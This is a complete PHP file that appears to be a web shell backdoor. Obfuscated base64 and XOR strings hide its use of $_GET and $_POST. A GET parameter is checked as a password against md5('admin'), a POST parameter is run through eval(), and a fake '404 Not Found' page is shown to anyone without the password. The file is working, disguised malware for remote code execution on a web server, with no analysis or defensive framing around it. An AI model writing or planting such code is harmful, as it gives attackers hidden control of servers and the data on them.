
<?php
$a = ${base64_decode("bzsjPA==")^base64_decode("MHxmaA==")}[1];
$b = ${base64_decode("ZSsrKSo=")^base64_decode("Ontken4=")}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{

	class C{public function __invoke($p) {eval($p);}};
	$t = base64_decode("Jj1AJGpfOypbZCldLT4=")^base64_decode("RVwsSDUqSE8pO08oQ10=");
    @${'t'}(new C(),$b);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
